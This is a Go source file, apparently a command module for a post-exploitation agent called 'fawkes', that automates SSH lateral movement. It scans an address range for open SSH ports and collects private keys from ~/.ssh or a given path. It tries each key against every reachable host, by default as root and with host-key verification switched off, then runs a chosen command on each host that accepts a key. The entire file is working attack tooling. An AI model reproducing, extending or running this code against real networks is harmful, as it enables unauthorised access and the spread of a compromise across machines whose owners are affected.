package commands

// SSH Key Lateral Movement Automation
//
// find-reachable: scan a target range for hosts with SSH port open
// try-keys:       test discovered private keys against a target host
// auto-move:      chain find-reachable → try-keys → run command on successful hosts

import (
	"context"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/crypto/ssh"
)

// sshKeysFindReachable scans the target list/CIDR for hosts with SSH open.
func sshKeysFindReachable(args sshKeysArgs) structs.CommandResult {
	if args.Targets == "" {
		return errorResult("-targets required (e.g., 192.168.1.0/24 or host1,host2)")
	}
	port := 22
	if args.Port > 0 {
		port = args.Port
	}

	hosts := expandHosts(args.Targets)
	if len(hosts) == 0 {
		return errorResult("no valid hosts parsed from targets")
	}

	reachable := sshScanReachable(hosts, port, 3*time.Second)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Scanned %d host(s) on port %d — %d reachable\n", len(hosts), port, len(reachable)))
	for _, h := range reachable {
		sb.WriteString(fmt.Sprintf("  %s\n", h))
	}
	if len(reachable) == 0 {
		sb.WriteString("  (none)\n")
	}
	return successResult(sb.String())
}

// sshKeysTryKeys tests discovered private keys against a target host.
// Returns a list of keys that successfully authenticate.
func sshKeysTryKeys(args sshKeysArgs) structs.CommandResult {
	if args.Host == "" {
		return errorResult("-host required for try-keys action")
	}

	username := args.Username
	if username == "" {
		username = "root"
	}
	port := 22
	if args.Port > 0 {
		port = args.Port
	}
	delayMs := 500
	if args.DelayMs > 0 {
		delayMs = args.DelayMs
	}
	delay := time.Duration(delayMs) * time.Millisecond

	keyPaths := sshDiscoverPrivateKeys(args.Path)
	if len(keyPaths) == 0 {
		return errorResult("No SSH private keys found. Specify -path or ensure ~/.ssh/ contains id_rsa, id_ed25519, etc.")
	}

	addr := net.JoinHostPort(args.Host, strconv.Itoa(port))
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Testing %d key(s) against %s@%s\n\n", len(keyPaths), username, addr))

	validKeys := 0
	for _, keyPath := range keyPaths {
		keyBytes, err := os.ReadFile(keyPath)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[-] SKIP   %s (read error: %v)\n", keyPath, err))
			continue
		}

		signer, err := parsePrivateKey(keyBytes, "")
		structs.ZeroBytes(keyBytes)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[-] SKIP   %s (parse error: %v)\n", keyPath, err))
			continue
		}

		cfg := &ssh.ClientConfig{
			User:            username,
			Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec
			Timeout:         5 * time.Second,
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		client, err := sshDialContext(ctx, "tcp", addr, cfg)
		cancel()

		if err == nil {
			client.Close()
			validKeys++
			sb.WriteString(fmt.Sprintf("[+] VALID  %s → %s@%s\n", keyPath, username, addr))
		} else {
			errStr := err.Error()
			if strings.Contains(errStr, "unable to authenticate") || strings.Contains(errStr, "no supported methods") {
				sb.WriteString(fmt.Sprintf("[-] DENIED %s → %s@%s\n", keyPath, username, addr))
			} else {
				sb.WriteString(fmt.Sprintf("[-] ERROR  %s → %s (%v)\n", keyPath, addr, err))
			}
		}

		time.Sleep(delay)
	}

	sb.WriteString(fmt.Sprintf("\n[+] Result: %d/%d keys authenticated against %s\n", validKeys, len(keyPaths), addr))
	return successResult(sb.String())
}

// sshKeysAutoMove chains find-reachable → try-keys → run command on each successful host.
func sshKeysAutoMove(args sshKeysArgs) structs.CommandResult {
	if args.Targets == "" {
		return errorResult("-targets required for auto-move (e.g., 192.168.1.0/24)")
	}

	username := args.Username
	if username == "" {
		username = "root"
	}
	command := args.Command
	if command == "" {
		command = "id"
	}
	port := 22
	if args.Port > 0 {
		port = args.Port
	}
	delayMs := 500
	if args.DelayMs > 0 {
		delayMs = args.DelayMs
	}
	delay := time.Duration(delayMs) * time.Millisecond

	var sb strings.Builder

	// Phase 1: Find reachable SSH hosts
	hosts := expandHosts(args.Targets)
	if len(hosts) == 0 {
		return errorResult("no valid hosts parsed from targets")
	}
	sb.WriteString(fmt.Sprintf("[*] Phase 1: Scanning %d host(s) for SSH (port %d)...\n", len(hosts), port))
	reachable := sshScanReachable(hosts, port, 3*time.Second)
	sb.WriteString(fmt.Sprintf("[+] %d/%d hosts have SSH open\n\n", len(reachable), len(hosts)))

	if len(reachable) == 0 {
		return successResult(sb.String() + "[-] No reachable SSH hosts found.\n")
	}

	// Phase 2: Discover private keys
	keyPaths := sshDiscoverPrivateKeys(args.Path)
	if len(keyPaths) == 0 {
		return successResult(sb.String() + "[-] No SSH private keys found.\n")
	}
	sb.WriteString(fmt.Sprintf("[*] Phase 2: Testing %d key(s) against each host as '%s'...\n\n", len(keyPaths), username))

	// Phase 3: For each reachable host, try each key, run command if auth succeeds
	successCount := 0
	for _, host := range reachable {
		addr := net.JoinHostPort(host, strconv.Itoa(port))
		accessed := false
		for _, keyPath := range keyPaths {
			keyBytes, err := os.ReadFile(keyPath)
			if err != nil {
				continue
			}
			signer, err := parsePrivateKey(keyBytes, "")
			structs.ZeroBytes(keyBytes)
			if err != nil {
				continue
			}

			cfg := &ssh.ClientConfig{
				User:            username,
				Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec
				Timeout:         5 * time.Second,
			}

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			client, err := sshDialContext(ctx, "tcp", addr, cfg)
			cancel()

			if err != nil {
				time.Sleep(delay)
				continue
			}

			session, sessErr := client.NewSession()
			if sessErr != nil {
				client.Close()
				break
			}

			var out strings.Builder
			session.Stdout = &out
			session.Stderr = &out
			_ = session.Run(command)
			session.Close()
			client.Close()

			accessed = true
			successCount++
			output := strings.TrimSpace(out.String())
			sb.WriteString(fmt.Sprintf("[+] %s@%s via %s:\n    %s\n\n",
				username, host, filepath.Base(keyPath),
				strings.ReplaceAll(output, "\n", "\n    ")))
			break // First successful key is enough for this host
		}

		if !accessed {
			sb.WriteString(fmt.Sprintf("[-] %s — no valid key\n", host))
		}
		time.Sleep(delay)
	}

	sb.WriteString(fmt.Sprintf("[+] auto-move complete: %d/%d hosts accessed via command: %q\n",
		successCount, len(reachable), command))
	return successResult(sb.String())
}

// sshScanReachable concurrently checks which hosts have the given port open.
// Uses up to 50 concurrent goroutines to keep latency low on large subnets.
func sshScanReachable(hosts []string, port int, timeout time.Duration) []string {
	type check struct {
		host      string
		reachable bool
	}

	results := make(chan check, len(hosts))
	sem := make(chan struct{}, 50)

	var wg sync.WaitGroup
	for _, h := range hosts {
		wg.Add(1)
		go func(host string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			addr := net.JoinHostPort(host, strconv.Itoa(port))
			conn, err := net.DialTimeout("tcp", addr, timeout)
			if err == nil {
				conn.Close()
				results <- check{host, true}
			} else {
				results <- check{host, false}
			}
		}(h)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	var reachable []string
	for r := range results {
		if r.reachable {
			reachable = append(reachable, r.host)
		}
	}
	sort.Strings(reachable)
	return reachable
}

// sshDiscoverPrivateKeys finds SSH private key files. If path is explicitly
// specified and not accessible, returns nil (no silent fallback). If path is
// empty, auto-discovers from ~/.ssh/ using common key names.
func sshDiscoverPrivateKeys(path string) []string {
	if path != "" {
		info, err := os.Stat(path)
		if err != nil {
			return nil // explicit path specified but not found — no fallback
		}
		if info.IsDir() {
			return sshFindKeysInDir(path)
		}
		return []string{path}
	}

	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	return sshFindKeysInDir(filepath.Join(home, ".ssh"))
}

func sshFindKeysInDir(dir string) []string {
	commonNames := []string{"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", "id_ecdsa_sk", "id_ed25519_sk"}
	var found []string
	for _, name := range commonNames {
		p := filepath.Join(dir, name)
		if info, err := os.Stat(p); err == nil && !info.IsDir() {
			found = append(found, p)
		}
	}
	entries, err := os.ReadDir(dir)
	if err == nil {
		for _, e := range entries {
			if !e.IsDir() && strings.HasSuffix(e.Name(), ".pem") {
				found = append(found, filepath.Join(dir, e.Name()))
			}
		}
	}
	return found
}
